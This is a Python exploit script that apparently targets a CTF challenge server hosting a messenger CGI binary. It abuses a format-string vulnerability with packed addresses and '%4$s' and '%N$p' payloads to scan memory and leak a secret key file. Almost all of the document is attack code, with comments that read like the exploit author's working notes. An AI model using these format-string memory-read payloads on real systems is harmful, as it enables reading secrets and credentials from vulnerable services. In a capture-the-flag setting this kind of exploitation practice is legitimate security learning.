#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_cmd(cmd, body=None, extra_params=""):
    url = f"{BASE}/cgi-bin/msn_diag?cmd={cmd}"
    if body:
        url += f"&body={urllib.parse.quote(body, safe='')}"
    if extra_params:
        url += f"&{extra_params}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read().decode('latin-1', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

def send_msg(body):
    return send_cmd("MSG", body)

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception as e:
        return b""

def extract_diag(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return raw

# Strategy: The stack only shows a few values. Let's think differently.
# From AAAA%p%p%p%p: AAAA is at pos 4
# pos 1: stack addr (arg to printf, our input buf ptr)
# pos 2: NULL 
# pos 3: 0x8049530 (constant)
# pos 4+: our input

# With the actual format string approach, the key might be a GLOBAL variable
# The binary is a CGI that reads the key at startup
# Key is at /app/data/msn_epoch.key
# 
# Let me try: maybe the key's address is lurking somewhere we haven't looked
# Let me scan a targeted range more efficiently

print("=== Quick targeted scan: .data section 0x8049000-0x804a000 ===")
good = []
for addr in range(0x8049000, 0x804a000, 4):
    addr_bytes = struct.pack('<I', addr)
    payload = addr_bytes + b'%4$s'
    raw = send_msg_raw(payload)
    content = extract_diag(raw)
    if len(content) >= 6:
        try:
            text = content.decode('ascii')
            if all(32 <= ord(c) < 127 for c in text) and len(text) >= 6:
                print(f"  0x{addr:08x}: {repr(text)}")
                good.append((addr, text))
        except:
            pass
    # Also store raw if interesting
    elif len(content) > 0 and content != b'(null)':
        pass

print(f"Found {len(good)} ASCII strings")

print()
print("=== Try USR with format strings ===")
for i in range(1, 20):
    r = send_cmd("USR", f"%{i}$p")
    print(f"USR pos {i}: {r.strip()}")

print()
print("=== Try STA with body =====")
for i in range(1, 20):
    r = send_cmd("STA", f"%{i}$p")
    print(f"STA pos {i}: {r.strip()}")

print()
print("=== Look for key via special message body ===")
# Maybe using 'key' or specific keywords
for body in ['key', 'KEY', 'secret', 'epoch', 'password', '/app/data/msn_epoch.key']:
    r = send_msg(body)
    print(f"MSG '{body}': {r.strip()}")

print()
print("=== Try to use format string to read the key file path string ===")
# The path /app/data/msn_epoch.key is likely in the binary's .rodata
# Let's look for null-terminated ASCII strings in range 0x8048000-0x8049000
good2 = []
for addr in range(0x8048000, 0x8049600, 4):
    addr_bytes = struct.pack('<I', addr)
    payload = addr_bytes + b'%4$s'
    raw = send_msg_raw(payload)
    content = extract_diag(raw)
    if len(content) >= 5:
        try:
            text = content.decode('ascii')
            if all(32 <= ord(c) < 127 for c in text):
                print(f"  rodata 0x{addr:08x}: {repr(text[:80])}")
                good2.append((addr, text))
        except:
            pass

print(f"Found {len(good2)} rodata strings")
